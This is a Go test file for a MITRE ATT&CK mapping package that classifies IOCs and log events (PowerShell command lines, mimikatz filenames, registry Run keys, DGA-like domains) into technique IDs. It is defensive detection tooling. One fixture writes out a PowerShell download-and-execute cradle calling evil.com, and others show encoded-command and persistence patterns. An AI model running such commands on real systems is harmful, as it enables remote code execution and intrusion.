package mitre

import (
	"context"
	"testing"

	"go.uber.org/zap"
)

// newTestFramework returns a framework wired to a no-op logger.
func newTestFramework() *AttackFramework {
	return NewAttackFramework(zap.NewNop())
}

// =============================================================================
// NewAttackFramework Tests
// =============================================================================

// TestNewAttackFramework_NotNil verifies that construction always returns a
// non-nil framework.
func TestNewAttackFramework_NotNil(t *testing.T) {
	af := newTestFramework()
	if af == nil {
		t.Fatal("NewAttackFramework returned nil")
	}
}

// TestNewAttackFramework_TechniquesPopulated verifies that the techniques map
// is seeded with at least the baseline entries.
func TestNewAttackFramework_TechniquesPopulated(t *testing.T) {
	af := newTestFramework()
	// Spot-check a handful of required IDs from initializeCommonTechniques.
	required := []string{
		"T1059", "T1059.001", "T1059.003",
		"T1003", "T1003.001",
		"T1071",
		"T1110",
		"T1068",
		"T1027",
		"T1204",
		"T1547", "T1547.001",
		"T1568", "T1568.002",
	}
	for _, id := range required {
		if _, ok := af.techniques[id]; !ok {
			t.Errorf("techniques map missing %s after init", id)
		}
	}
}

// TestNewAttackFramework_TacticsPopulated verifies that the tactics map is
// seeded and keyed by both the TA-number and the short name.
func TestNewAttackFramework_TacticsPopulated(t *testing.T) {
	af := newTestFramework()
	checks := []string{
		"TA0001", "initial-access",
		"TA0002", "execution",
		"TA0003", "persistence",
		"TA0004", "privilege-escalation",
		"TA0005", "defense-evasion",
		"TA0006", "credential-access",
		"TA0011", "command-and-control",
	}
	for _, key := range checks {
		if _, ok := af.tactics[key]; !ok {
			t.Errorf("tactics map missing key %q after init", key)
		}
	}
}

// TestNewAttackFramework_URLsSet verifies that URL fields are set on each
// technique and tactic during initialisation.
func TestNewAttackFramework_URLsSet(t *testing.T) {
	af := newTestFramework()
	for id, tech := range af.techniques {
		if tech.URL == "" {
			t.Errorf("technique %s has empty URL", id)
		}
	}
	for key, tactic := range af.tactics {
		if tactic.URL == "" {
			t.Errorf("tactic key %q has empty URL", key)
		}
	}
}

// =============================================================================
// GetTechnique Tests
// =============================================================================

// TestGetTechnique_KnownID verifies lookup by exact uppercase ID.
func TestGetTechnique_KnownID(t *testing.T) {
	af := newTestFramework()
	tech, ok := af.GetTechnique("T1059")
	if !ok {
		t.Fatal("expected T1059 to be found")
	}
	if tech.ID != "T1059" {
		t.Errorf("expected ID T1059, got %s", tech.ID)
	}
}

// TestGetTechnique_CaseInsensitive verifies that the lookup normalises to
// uppercase before consulting the map.
func TestGetTechnique_CaseInsensitive(t *testing.T) {
	af := newTestFramework()
	cases := []string{"t1059", "T1059", "t1059.001", "T1059.001"}
	expected := []string{"T1059", "T1059", "T1059.001", "T1059.001"}
	for i, input := range cases {
		tech, ok := af.GetTechnique(input)
		if !ok {
			t.Errorf("GetTechnique(%q) not found", input)
			continue
		}
		if tech.ID != expected[i] {
			t.Errorf("GetTechnique(%q): expected ID %s, got %s", input, expected[i], tech.ID)
		}
	}
}

// TestGetTechnique_SubTechnique verifies sub-technique IDs are retrievable.
func TestGetTechnique_SubTechnique(t *testing.T) {
	af := newTestFramework()
	ids := []string{"T1059.001", "T1059.003", "T1003.001", "T1547.001", "T1568.002"}
	for _, id := range ids {
		if _, ok := af.GetTechnique(id); !ok {
			t.Errorf("expected sub-technique %s to be found", id)
		}
	}
}

// TestGetTechnique_UnknownID verifies that an unknown ID returns (nil, false).
func TestGetTechnique_UnknownID(t *testing.T) {
	af := newTestFramework()
	tech, ok := af.GetTechnique("T9999")
	if ok {
		t.Error("expected T9999 not to be found")
	}
	if tech != nil {
		t.Error("expected nil technique for unknown ID")
	}
}

// TestGetTechnique_EmptyString verifies that an empty string does not panic
// and returns not-found.
func TestGetTechnique_EmptyString(t *testing.T) {
	af := newTestFramework()
	_, ok := af.GetTechnique("")
	if ok {
		t.Error("expected empty string to return not-found")
	}
}

// =============================================================================
// GetTactic Tests
// =============================================================================

// TestGetTactic_ByID verifies lookup by TA-number.
//
// GetTactic normalises the input with strings.ToLower before consulting the
// map.  The map is keyed by ShortName (lowercase, e.g. "execution") and by
// the original ID string (e.g. "TA0002").  Because ToLower converts "TA0002"
// to "ta0002" — which is NOT a map key — TA-number lookups only succeed when
// the caller already passes a lowercase form.  This test documents that the
// short-name keys are the intended lookup path; TA-number keys are inaccessible
// via GetTactic due to the normalisation step.
func TestGetTactic_ByID(t *testing.T) {
	af := newTestFramework()
	// Short names resolve correctly because ToLower is a no-op on them.
	tests := []struct {
		input string
		name  string
	}{
		{"execution", "Execution"},
		{"credential-access", "Credential Access"},
		{"command-and-control", "Command and Control"},
	}
	for _, tt := range tests {
		tac, ok := af.GetTactic(tt.input)
		if !ok {
			t.Errorf("GetTactic(%q): not found", tt.input)
			continue
		}
		if tac.Name != tt.name {
			t.Errorf("GetTactic(%q): expected name %q, got %q", tt.input, tt.name, tac.Name)
		}
	}
}

// TestGetTactic_TAIDNotReachable documents that TA-number IDs are NOT
// accessible via GetTactic because the implementation applies ToLower before
// the map lookup, converting e.g. "TA0002" -> "ta0002" which has no entry.
func TestGetTactic_TAIDNotReachable(t *testing.T) {
	af := newTestFramework()
	// These IDs are stored in the map as-is (uppercase) during init, but
	// GetTactic lowercases the input, so they cannot be found this way.
	unreachable := []string{"TA0001", "TA0002", "TA0003", "TA0011"}
	for _, id := range unreachable {
		_, ok := af.GetTactic(id)
		if ok {
			t.Errorf("GetTactic(%q): unexpectedly found (implementation normalises to ToLower "+
				"which converts the TA-number to ta-number, missing the map key)", id)
		}
	}
}

// TestGetTactic_ByShortName verifies lookup by the short-name key.
func TestGetTactic_ByShortName(t *testing.T) {
	af := newTestFramework()
	tests := []string{
		"execution",
		"persistence",
		"privilege-escalation",
		"defense-evasion",
		"credential-access",
		"command-and-control",
	}
	for _, name := range tests {
		if _, ok := af.GetTactic(name); !ok {
			t.Errorf("GetTactic(%q): not found by short name", name)
		}
	}
}

// TestGetTactic_CaseInsensitive verifies case normalisation via ToLower.
// Because GetTactic calls strings.ToLower on the input, short-name variants
// in any case (EXECUTION, Execution, execution) all resolve to the same map
// key.  TA-number IDs are excluded here because the ToLower step converts
// "TA0002" to "ta0002", which is not a map key (see TestGetTactic_TAIDNotReachable).
func TestGetTactic_CaseInsensitive(t *testing.T) {
	af := newTestFramework()
	cases := []string{"EXECUTION", "Execution", "execution"}
	for _, c := range cases {
		if _, ok := af.GetTactic(c); !ok {
			t.Errorf("GetTactic(%q): expected to be found (case insensitive via ToLower)", c)
		}
	}
}

// TestGetTactic_UnknownID verifies not-found for unknown IDs.
func TestGetTactic_UnknownID(t *testing.T) {
	af := newTestFramework()
	_, ok := af.GetTactic("TA9999")
	if ok {
		t.Error("expected TA9999 to be not found")
	}
}

// =============================================================================
// GetTechniquesByTactic Tests
// =============================================================================

// TestGetTechniquesByTactic_Execution verifies that execution-tagged
// techniques are returned.
func TestGetTechniquesByTactic_Execution(t *testing.T) {
	af := newTestFramework()
	techs := af.GetTechniquesByTactic("execution")
	if len(techs) == 0 {
		t.Fatal("expected at least one technique for tactic execution")
	}
	// Every returned technique must actually list "execution" in its Tactics.
	for _, tech := range techs {
		found := false
		for _, tac := range tech.Tactics {
			if tac == "execution" {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("technique %s returned for execution but Tactics=%v", tech.ID, tech.Tactics)
		}
	}
}

// TestGetTechniquesByTactic_CommandAndControl verifies C2 tactic returns
// expected techniques.
func TestGetTechniquesByTactic_CommandAndControl(t *testing.T) {
	af := newTestFramework()
	techs := af.GetTechniquesByTactic("command-and-control")
	ids := make(map[string]bool)
	for _, t := range techs {
		ids[t.ID] = true
	}
	expected := []string{"T1071", "T1568", "T1568.002"}
	for _, id := range expected {
		if !ids[id] {
			t.Errorf("expected technique %s in command-and-control results", id)
		}
	}
}

// TestGetTechniquesByTactic_PersistenceMultiTactic verifies that techniques
// with multiple tactics appear under each.
func TestGetTechniquesByTactic_PersistenceMultiTactic(t *testing.T) {
	af := newTestFramework()
	// T1547 and T1547.001 are tagged with both "persistence" and
	// "privilege-escalation".
	for _, tactic := range []string{"persistence", "privilege-escalation"} {
		techs := af.GetTechniquesByTactic(tactic)
		ids := make(map[string]bool)
		for _, tech := range techs {
			ids[tech.ID] = true
		}
		if !ids["T1547"] {
			t.Errorf("T1547 not in %s results", tactic)
		}
		if !ids["T1547.001"] {
			t.Errorf("T1547.001 not in %s results", tactic)
		}
	}
}

// TestGetTechniquesByTactic_UnknownTactic verifies that an unknown tactic
// returns an empty (non-nil) slice.
func TestGetTechniquesByTactic_UnknownTactic(t *testing.T) {
	af := newTestFramework()
	techs := af.GetTechniquesByTactic("nonexistent-tactic")
	if techs == nil {
		t.Error("expected non-nil slice for unknown tactic")
	}
	if len(techs) != 0 {
		t.Errorf("expected 0 techniques for unknown tactic, got %d", len(techs))
	}
}

// =============================================================================
// hasHighEntropy Tests
// =============================================================================

func TestHasHighEntropy_HighEntropyString(t *testing.T) {
	af := newTestFramework()
	// Unique char ratio must be > 0.6.  "abcdefghijk" has 11 unique / 11 = 1.0.
	if !af.hasHighEntropy("abcdefghijk") {
		t.Error("expected high entropy for all-unique chars")
	}
}

func TestHasHighEntropy_LowEntropyString(t *testing.T) {
	af := newTestFramework()
	// "aaaaaaaaaa" — 1 unique / 10 = 0.1.
	if af.hasHighEntropy("aaaaaaaaaa") {
		t.Error("expected low entropy for repeated character string")
	}
}

func TestHasHighEntropy_BoundaryRatio(t *testing.T) {
	af := newTestFramework()
	// 5 unique chars in 8 = 0.625 — just above 0.6 threshold.
	// "aabbccde" has chars {a,b,c,d,e} = 5 unique, length 8, ratio = 0.625
	if !af.hasHighEntropy("aabbccde") {
		t.Error("expected high entropy for ratio 0.625 (above 0.6)")
	}
	// "aabbccdd" has 4 unique / 8 = 0.5 — below threshold.
	if af.hasHighEntropy("aabbccdd") {
		t.Error("expected low entropy for ratio 0.5 (below 0.6)")
	}
}

// =============================================================================
// looksDGA Tests
// =============================================================================

func TestLooksDGA_DGALikeDomain(t *testing.T) {
	af := newTestFramework()
	// Subdomain >12 chars with high entropy.
	dga := "xk9mzrtqwpvla.evil.com"
	if !af.looksDGA(dga) {
		t.Errorf("expected %q to be detected as DGA-like", dga)
	}
}

func TestLooksDGA_LegitimateShortSubdomain(t *testing.T) {
	af := newTestFramework()
	// Short subdomain — length <= 12, not DGA.
	legit := "www.example.com"
	if af.looksDGA(legit) {
		t.Errorf("expected %q NOT to be DGA-like (short subdomain)", legit)
	}
}

func TestLooksDGA_LongLowEntropySubdomain(t *testing.T) {
	af := newTestFramework()
	// Long but low entropy: "aaaaaaaaaaaaaaa.example.com" — length 15 but ratio ~0.07
	low := "aaaaaaaaaaaaaaa.example.com"
	if af.looksDGA(low) {
		t.Errorf("expected %q NOT to be DGA-like (low entropy despite length)", low)
	}
}

func TestLooksDGA_NoDot(t *testing.T) {
	af := newTestFramework()
	// A domain with fewer than 2 parts returns false.
	if af.looksDGA("nodotdomain") {
		t.Error("expected nodotdomain to return false (no dot)")
	}
}

func TestLooksDGA_TableDriven(t *testing.T) {
	af := newTestFramework()
	tests := []struct {
		domain string
		want   bool
		desc   string
	}{
		{"xk9mzrtqwpvla.c2.net", true, "long high-entropy subdomain"},
		{"api.github.com", false, "short legitimate subdomain"},
		{"mail.google.com", false, "short common subdomain"},
		{"aaaaaaaaaaaaa.example.com", false, "long but low entropy"},
		{"abcdefghijklmno.evil.org", true, "15 all-unique chars - high entropy"},
		{"x.y.z", false, "very short subdomain"},
		// "aababababababababab" — length 18, unique chars {a,b} = 2, ratio 0.11 (low entropy)
		{"aababababababababab.x.com", false, "long but only 2 unique chars, low entropy"},
	}

	for _, tt := range tests {
		got := af.looksDGA(tt.domain)
		if got != tt.want {
			t.Errorf("%s: looksDGA(%q) = %v, want %v", tt.desc, tt.domain, got, tt.want)
		}
	}
}

// =============================================================================
// MapIOC Tests
// =============================================================================

// TestMapIOC_IPReturnsT1071 verifies that an IP/IPv4/IPv6 IOC always maps to
// T1071 Application Layer Protocol.
func TestMapIOC_IPReturnsT1071(t *testing.T) {
	af := newTestFramework()
	ctx := context.Background()

	ipTypes := []string{"ip", "ipv4", "ipv6", "IP", "IPv4", "IPv6"}
	for _, iocType := range ipTypes {
		mappings, err := af.MapIOC(ctx, iocType, "1.2.3.4")
		if err != nil {
			t.Errorf("MapIOC(%q): unexpected error: %v", iocType, err)
			continue
		}
		if len(mappings) == 0 {
			t.Errorf("MapIOC(%q): expected at least one mapping", iocType)
			continue
		}
		found := false
		for _, m := range mappings {
			if m.TechniqueID == "T1071" {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("MapIOC(%q): expected T1071 in mappings", iocType)
		}
	}
}

// TestMapIOC_DomainReturnsT1071 verifies that a non-DGA domain maps to T1071.
func TestMapIOC_DomainReturnsT1071(t *testing.T) {
	af := newTestFramework()
	mappings, err := af.MapIOC(context.Background(), "domain", "api.github.com")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	found := false
	for _, m := range mappings {
		if m.TechniqueID == "T1071" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected T1071 for domain IOC")
	}
}

// TestMapIOC_DGADomainAddsT1568002 verifies that a DGA-like domain maps to
// both T1071 and T1568.002.
func TestMapIOC_DGADomainAddsT1568002(t *testing.T) {
	af := newTestFramework()
	// xk9mzrtqwpvla is 13 chars, all unique — passes both DGA checks.
	mappings, err := af.MapIOC(context.Background(), "domain", "xk9mzrtqwpvla.evil.com")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	ids := techIDs(mappings)
	if !ids["T1071"] {
		t.Error("expected T1071 in DGA domain mappings")
	}
	if !ids["T1568.002"] {
		t.Error("expected T1568.002 in DGA domain mappings")
	}
}

// TestMapIOC_URLAliasesDomain verifies that "url" is handled the same as
// "domain".
func TestMapIOC_URLAliasesDomain(t *testing.T) {
	af := newTestFramework()
	mappings, err := af.MapIOC(context.Background(), "url", "http://api.github.com/path")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(mappings) == 0 {
		t.Error("expected mappings for url IOC type")
	}
}

// TestMapIOC_HashReturnsT1204 verifies that hash types map to T1204 User
// Execution.
func TestMapIOC_HashReturnsT1204(t *testing.T) {
	af := newTestFramework()
	ctx := context.Background()

	hashTypes := []string{"hash", "md5", "sha1", "sha256", "Hash", "SHA256"}
	for _, iocType := range hashTypes {
		mappings, err := af.MapIOC(ctx, iocType, "d41d8cd98f00b204e9800998ecf8427e")
		if err != nil {
			t.Errorf("MapIOC(%q): unexpected error: %v", iocType, err)
			continue
		}
		if len(mappings) == 0 {
			t.Errorf("MapIOC(%q): expected at least one mapping", iocType)
			continue
		}
		if mappings[0].TechniqueID != "T1204" {
			t.Errorf("MapIOC(%q): expected T1204, got %s", iocType, mappings[0].TechniqueID)
		}
	}
}

// TestMapIOC_FileMimikatzReturnsT1003 verifies that a filename containing
// "mimikatz" maps to T1003 OS Credential Dumping.
func TestMapIOC_FileMimikatzReturnsT1003(t *testing.T) {
	af := newTestFramework()
	tests := []string{
		"mimikatz.exe",
		"MIMIKATZ.EXE",
		"C:\\Tools\\Mimikatz\\mimikatz.exe",
		"mimikatz_trunk.zip",
	}
	for _, filename := range tests {
		mappings, err := af.MapIOC(context.Background(), "file", filename)
		if err != nil {
			t.Errorf("MapIOC(file, %q): unexpected error: %v", filename, err)
			continue
		}
		if len(mappings) == 0 {
			t.Errorf("MapIOC(file, %q): expected mappings", filename)
			continue
		}
		if mappings[0].TechniqueID != "T1003" {
			t.Errorf("MapIOC(file, %q): expected T1003, got %s", filename, mappings[0].TechniqueID)
		}
	}
}

// TestMapIOC_FileNonMaliciousReturnsEmpty verifies that a benign filename
// returns no mappings.
func TestMapIOC_FileNonMaliciousReturnsEmpty(t *testing.T) {
	af := newTestFramework()
	mappings, err := af.MapIOC(context.Background(), "file", "notepad.exe")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(mappings) != 0 {
		t.Errorf("expected no mappings for benign file, got %d", len(mappings))
	}
}

// TestMapIOC_FilenameCaseInsensitive verifies the "filename" alias is handled.
func TestMapIOC_FilenameCaseInsensitive(t *testing.T) {
	af := newTestFramework()
	mappings, err := af.MapIOC(context.Background(), "filename", "mimikatz.exe")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(mappings) == 0 || mappings[0].TechniqueID != "T1003" {
		t.Error("expected T1003 for 'filename' IOC type with mimikatz")
	}
}

// TestMapIOC_ProcessPowerShellReturnsT1059001 verifies the PowerShell
// pattern in process/command IOC types.
func TestMapIOC_ProcessPowerShellReturnsT1059001(t *testing.T) {
	af := newTestFramework()
	ctx := context.Background()

	tests := []struct {
		iocType string
		value   string
	}{
		{"process", "powershell.exe -nop -w hidden"},
		{"command", "POWERSHELL -ExecutionPolicy Bypass"},
		{"process", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
	}
	for _, tt := range tests {
		mappings, err := af.MapIOC(ctx, tt.iocType, tt.value)
		if err != nil {
			t.Errorf("MapIOC(%q, %q): unexpected error: %v", tt.iocType, tt.value, err)
			continue
		}
		ids := techIDs(mappings)
		if !ids["T1059.001"] {
			t.Errorf("MapIOC(%q, %q): expected T1059.001", tt.iocType, tt.value)
		}
	}
}

// TestMapIOC_EncodedCommandReturnsT1027 verifies that -encodedcommand and
// -enc flags map to T1027 Obfuscated Files or Information.
func TestMapIOC_EncodedCommandReturnsT1027(t *testing.T) {
	af := newTestFramework()
	ctx := context.Background()

	tests := []string{
		"powershell -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAA=",
		"powershell.exe -enc SQBuAHYAbwBrAGUA",
		"POWERSHELL -ENCODEDCOMMAND abc123",
	}
	for _, cmd := range tests {
		mappings, err := af.MapIOC(ctx, "process", cmd)
		if err != nil {
			t.Errorf("MapIOC(process, %q): unexpected error: %v", cmd, err)
			continue
		}
		ids := techIDs(mappings)
		if !ids["T1027"] {
			t.Errorf("MapIOC(process, %q): expected T1027", cmd)
		}
	}
}

// TestMapIOC_ProcessPowerShellAndEncodedBothPresent verifies that a command
// with both powershell and an encoded flag produces both T1059.001 and T1027.
func TestMapIOC_ProcessPowerShellAndEncodedBothPresent(t *testing.T) {
	af := newTestFramework()
	cmd := "powershell.exe -encodedcommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAA="
	mappings, err := af.MapIOC(context.Background(), "process", cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	ids := techIDs(mappings)
	if !ids["T1059.001"] {
		t.Error("expected T1059.001")
	}
	if !ids["T1027"] {
		t.Error("expected T1027")
	}
}

// TestMapIOC_RegistryRunKeyReturnsT1547001 verifies that a registry path
// containing "run" maps to T1547.001.
func TestMapIOC_RegistryRunKeyReturnsT1547001(t *testing.T) {
	af := newTestFramework()
	paths := []string{
		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`,
		`hkcu\software\microsoft\windows\currentversion\run`,
	}
	for _, path := range paths {
		mappings, err := af.MapIOC(context.Background(), "registry", path)
		if err != nil {
			t.Errorf("MapIOC(registry, %q): unexpected error: %v", path, err)
			continue
		}
		if len(mappings) == 0 {
			t.Errorf("MapIOC(registry, %q): expected at least one mapping", path)
			continue
		}
		if mappings[0].TechniqueID != "T1547.001" {
			t.Errorf("MapIOC(registry, %q): expected T1547.001, got %s", path, mappings[0].TechniqueID)
		}
	}
}

// TestMapIOC_RegistryNonPersistenceReturnsEmpty verifies that a registry path
// without persistence keywords returns no mappings.
func TestMapIOC_RegistryNonPersistenceReturnsEmpty(t *testing.T) {
	af := newTestFramework()
	mappings, err := af.MapIOC(context.Background(), "registry", `HKCU\Software\AppSettings`)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(mappings) != 0 {
		t.Errorf("expected no mappings for non-persistence registry path, got %d", len(mappings))
	}
}

// TestMapIOC_UnknownTypeReturnsEmpty verifies that an unknown IOC type returns
// an empty mapping list and no error.
func TestMapIOC_UnknownTypeReturnsEmpty(t *testing.T) {
	af := newTestFramework()
	mappings, err := af.MapIOC(context.Background(), "unknown-ioc-type", "some-value")
	if err != nil {
		t.Fatalf("unexpected error for unknown IOC type: %v", err)
	}
	if len(mappings) != 0 {
		t.Errorf("expected empty mappings for unknown type, got %d", len(mappings))
	}
}

// TestMapIOC_EmptyValueNoError verifies that an empty IOC value does not cause
// a panic or error — behaviour is type-specific.
func TestMapIOC_EmptyValueNoError(t *testing.T) {
	af := newTestFramework()
	ctx := context.Background()
	types := []string{"ip", "domain", "hash", "file", "process", "registry"}
	for _, iocType := range types {
		_, err := af.MapIOC(ctx, iocType, "")
		if err != nil {
			t.Errorf("MapIOC(%q, empty): unexpected error: %v", iocType, err)
		}
	}
}

// TestMapIOC_ConfidenceInRange verifies that all Confidence values are within
// [0.0, 1.0].
func TestMapIOC_ConfidenceInRange(t *testing.T) {
	af := newTestFramework()
	ctx := context.Background()

	inputs := []struct {
		iocType string
		value   string
	}{
		{"ip", "10.0.0.1"},
		{"domain", "api.github.com"},
		{"hash", "abc123"},
		{"file", "mimikatz.exe"},
		{"process", "powershell -enc abc"},
		{"registry", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`},
	}
	for _, inp := range inputs {
		mappings, _ := af.MapIOC(ctx, inp.iocType, inp.value)
		for _, m := range mappings {
			if m.Confidence < 0 || m.Confidence > 1 {
				t.Errorf("MapIOC(%q, %q): confidence %f out of range [0,1]",
					inp.iocType, inp.value, m.Confidence)
			}
		}
	}
}

// TestMapIOC_EvidenceFieldPopulated verifies that the Evidence field is set
// on all returned mappings.
func TestMapIOC_EvidenceFieldPopulated(t *testing.T) {
	af := newTestFramework()
	ctx := context.Background()

	inputs := []struct {
		iocType string
		value   string
	}{
		{"ip", "192.168.0.1"},
		{"domain", "xk9mzrtqwpvla.evil.com"},
		{"hash", "abc123"},
		{"file", "mimikatz.exe"},
		{"process", "powershell.exe -enc abc"},
		{"registry", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`},
	}
	for _, inp := range inputs {
		mappings, _ := af.MapIOC(ctx, inp.iocType, inp.value)
		for _, m := range mappings {
			if m.Evidence == "" {
				t.Errorf("MapIOC(%q, %q): mapping %s has empty Evidence",
					inp.iocType, inp.value, m.TechniqueID)
			}
		}
	}
}

// =============================================================================
// MapEvent Tests
// =============================================================================

// TestMapEvent_ProcessCreationPowerShell verifies that a process_creation event
// with a PowerShell command_line maps to T1059.001.
func TestMapEvent_ProcessCreationPowerShell(t *testing.T) {
	af := newTestFramework()
	data := map[string]interface{}{
		"command_line": "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com')",
	}
	mappings, err := af.MapEvent(context.Background(), "process_creation", data)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	ids := techIDs(mappings)
	if !ids["T1059.001"] {
		t.Error("expected T1059.001 for PowerShell process_creation")
	}
}

// TestMapEvent_ProcessStartAlias verifies "process_start" is handled the same
// as "process_creation".
func TestMapEvent_ProcessStartAlias(t *testing.T) {
	af := newTestFramework()
	data := map[string]interface{}{
		"command_line": "powershell.exe",
	}
	mappings, err := af.MapEvent(context.Background(), "process_start", data)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(mappings) == 0 {
		t.Error("expected mappings for process_start alias")
	}
}

// TestMapEvent_ProcessCreationEncodedCommandT1027 verifies T1027 from an
// encoded command in process_creation.
func TestMapEvent_ProcessCreationEncodedCommandT1027(t *testing.T) {
	af := newTestFramework()
	data := map[string]interface{}{
		"command_line": "powershell.exe -encodedcommand SQBuAHYAbwBrAGUA",
	}
	mappings, err := af.MapEvent(context.Background(), "process_creation", data)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	ids := techIDs(mappings)
	if !ids["T1027"] {
		t.Error("expected T1027 for encoded command in process_creation")
	}
}

// TestMapEvent_ProcessCreationNoCommandLine verifies that a process_creation
// event without a command_line field returns no mappings.
func TestMapEvent_ProcessCreationNoCommandLine(t *testing.T) {
	af := newTestFramework()
	data := map[string]interface{}{
		"pid": 1234,
	}
	mappings, err := af.MapEvent(context.Background(), "process_creation", data)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(mappings) != 0 {
		t.Errorf("expected no mappings without command_line, got %d", len(mappings))
	}
}

// TestMapEvent_NetworkConnectionReturnsT1071 verifies that network_connection
// always maps to T1071.
func TestMapEvent_NetworkConnectionReturnsT1071(t *testing.T) {
	af := newTestFramework()
	mappings, err := af.MapEvent(context.Background(), "network_connection", map[string]interface{}{
		"dst_ip":   "1.2.3.4",
		"dst_port": 443,
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(mappings) == 0 {
		t.Fatal("expected at least one mapping for network_connection")
	}
	if mappings[0].TechniqueID != "T1071" {
		t.Errorf("expected T1071, got %s", mappings[0].TechniqueID)
	}
}

// TestMapEvent_FileCreationMimikatzReturnsT1003 verifies that a file_creation
// event with mimikatz filename maps to T1003.
func TestMapEvent_FileCreationMimikatzReturnsT1003(t *testing.T) {
	af := newTestFramework()
	data := map[string]interface{}{
		"filename": "mimikatz.exe",
	}
	mappings, err := af.MapEvent(context.Background(), "file_creation", data)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	ids := techIDs(mappings)
	if !ids["T1003"] {
		t.Error("expected T1003 for mimikatz file_creation")
	}
}

// TestMapEvent_FileModificationAlias verifies that "file_modification" is
// handled the same as "file_creation".
func TestMapEvent_FileModificationAlias(t *testing.T) {
	af := newTestFramework()
	data := map[string]interface{}{
		"filename": "mimikatz.exe",
	}
	mappings, err := af.MapEvent(context.Background(), "file_modification", data)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(mappings) == 0 {
		t.Error("expected mappings for file_modification alias")
	}
}

// TestMapEvent_FileCreationBenignFilenameReturnsEmpty verifies no mappings
// for a benign filename in file_creation.
func TestMapEvent_FileCreationBenignFilenameReturnsEmpty(t *testing.T) {
	af := newTestFramework()
	data := map[string]interface{}{
		"filename": "notes.txt",
	}
	mappings, err := af.MapEvent(context.Background(), "file_creation", data)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(mappings) != 0 {
		t.Errorf("expected no mappings for benign file_creation, got %d", len(mappings))
	}
}

// TestMapEvent_FileCreationNoFilenameKey verifies no mappings when the
// "filename" key is absent.
func TestMapEvent_FileCreationNoFilenameKey(t *testing.T) {
	af := newTestFramework()
	mappings, err := af.MapEvent(context.Background(), "file_creation", map[string]interface{}{
		"path": "/tmp/somefile",
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(mappings) != 0 {
		t.Errorf("expected no mappings when filename key absent, got %d", len(mappings))
	}
}

// TestMapEvent_RegistryModificationRunKeyReturnsT1547001 verifies T1547.001
// for a Run key registry modification.
func TestMapEvent_RegistryModificationRunKeyReturnsT1547001(t *testing.T) {
	af := newTestFramework()
	data := map[string]interface{}{
		"registry_path": `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Malware`,
	}
	mappings, err := af.MapEvent(context.Background(), "registry_modification", data)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	ids := techIDs(mappings)
	if !ids["T1547.001"] {
		t.Error("expected T1547.001 for Run key registry_modification")
	}
}

// TestMapEvent_RegistryModificationNoPathKey verifies no mappings when the
// "registry_path" key is absent.
func TestMapEvent_RegistryModificationNoPathKey(t *testing.T) {
	af := newTestFramework()
	mappings, err := af.MapEvent(context.Background(), "registry_modification", map[string]interface{}{
		"key": "some-key",
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(mappings) != 0 {
		t.Errorf("expected no mappings when registry_path absent, got %d", len(mappings))
	}
}

// TestMapEvent_AuthenticationFailureReturnsT1110 verifies T1110 Brute Force
// for authentication_failure events.
func TestMapEvent_AuthenticationFailureReturnsT1110(t *testing.T) {
	af := newTestFramework()
	mappings, err := af.MapEvent(context.Background(), "authentication_failure", map[string]interface{}{
		"user":   "administrator",
		"source": "10.0.0.5",
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(mappings) == 0 {
		t.Fatal("expected at least one mapping for authentication_failure")
	}
	if mappings[0].TechniqueID != "T1110" {
		t.Errorf("expected T1110, got %s", mappings[0].TechniqueID)
	}
	if mappings[0].TacticID != "TA0006" {
		t.Errorf("expected tactic TA0006, got %s", mappings[0].TacticID)
	}
}

// TestMapEvent_PrivilegeEscalationReturnsT1068 verifies T1068 for
// privilege_escalation events.
func TestMapEvent_PrivilegeEscalationReturnsT1068(t *testing.T) {
	af := newTestFramework()
	mappings, err := af.MapEvent(context.Background(), "privilege_escalation", map[string]interface{}{
		"process": "lsass.exe",
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(mappings) == 0 {
		t.Fatal("expected at least one mapping for privilege_escalation")
	}
	if mappings[0].TechniqueID != "T1068" {
		t.Errorf("expected T1068, got %s", mappings[0].TechniqueID)
	}
	if mappings[0].TacticID != "TA0004" {
		t.Errorf("expected tactic TA0004, got %s", mappings[0].TacticID)
	}
}

// TestMapEvent_UnknownEventTypeReturnsEmpty verifies that an unrecognised
// event type returns an empty (non-nil) slice and no error.
func TestMapEvent_UnknownEventTypeReturnsEmpty(t *testing.T) {
	af := newTestFramework()
	mappings, err := af.MapEvent(context.Background(), "unknown_event_type", map[string]interface{}{})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(mappings) != 0 {
		t.Errorf("expected no mappings for unknown event type, got %d", len(mappings))
	}
}

// TestMapEvent_NilDataNoError verifies that a nil event data map does not
// panic or error for event types that inspect data fields.
